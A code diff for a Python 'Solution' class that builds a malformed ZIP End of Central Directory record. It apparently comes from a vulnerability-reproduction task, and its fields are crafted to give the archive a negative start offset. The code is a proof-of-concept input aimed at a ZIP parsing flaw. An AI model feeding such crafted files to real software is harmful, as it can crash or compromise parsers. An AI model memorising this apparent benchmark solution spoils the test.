@@ -1,17 +1,26 @@
-import struct
+import os
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        eocd = struct.pack(
-            "<IHHHHIIH",
-            0x06054B50,  # End of central dir signature
-            0,           # Number of this disk
-            0,           # Disk where central directory starts
-            1,           # Number of central directory records on this disk
-            1,           # Total number of central directory records
-            0xFFFFFFF0,  # Size of central directory (large to force negative start offset)
-            0,           # Offset of start of central directory
-            24           # ZIP file comment length
+        # End of Central Directory (EOCD) with crafted fields to make archive start offset negative
+        signature = b'\x50\x4b\x05\x06'      # EOCD signature
+        disk_no = b'\x00\x00'                # number of this disk
+        start_disk = b'\x00\x00'             # disk with start of central directory
+        entries_disk = b'\x01\x00'           # total entries on this disk
+        entries_total = b'\x01\x00'          # total entries
+        cd_size = b'\x01\x00\x00\x00'        # size of central directory (1)
+        cd_offset = b'\x00\x00\x00\x00'      # offset of start of central directory
+        comment_len = b'\x18\x00'            # ZIP file comment length (24)
+        comment = b'A' * 24                  # comment bytes
+
+        return (
+            signature +
+            disk_no +
+            start_disk +
+            entries_disk +
+            entries_total +
+            cd_size +
+            cd_offset +
+            comment_len +
+            comment
         )
-        comment = b"A" * 24
-        return eocd + comment
